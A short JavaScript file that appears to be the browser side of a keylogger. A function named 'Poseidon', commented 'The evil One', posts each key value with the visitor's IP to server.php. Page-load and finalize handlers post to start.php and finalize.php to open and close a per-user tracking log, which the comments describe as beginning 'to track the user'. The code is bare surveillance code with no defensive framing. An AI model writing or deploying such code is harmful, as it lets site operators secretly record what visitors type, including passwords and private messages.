
function Poseidon(key, ip) // The evil One, King of the Seas
{
	data = "key="+key+"&ip="+ip;
	var page = 'server.php';
	//console.log(data+' '+page );
	ajax(data, page);
}

window.onload = function() {
	
	var data = 'ip='+myip;	 	// sends ip
	var page2 = 'start.php';		// the start page: Registers in the beginning of the log file that you will begin to track the user.
	ajax(data, page2);
	//console.log(data);
	return 'Are you sure do you want to leave this page?';
}


function finalize() {
	
	var data = 'ip='+myip;	 	// sends ip
	var page3 = 'finalize.php';	// the finalization page: writes that you will close the page and will finalize the log file.
	
	ajax(data, page3);
}

//send serialized data, example: "key=93&ip=192.168.0.1"
function ajax(data, page) {
	
	var xmlhttp = new XMLHttpRequest();

   	xmlhttp.open("POST", page, false);
   	xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
    	xmlhttp.send(data);
    
  console.log(xmlhttp.responseText);
    
}
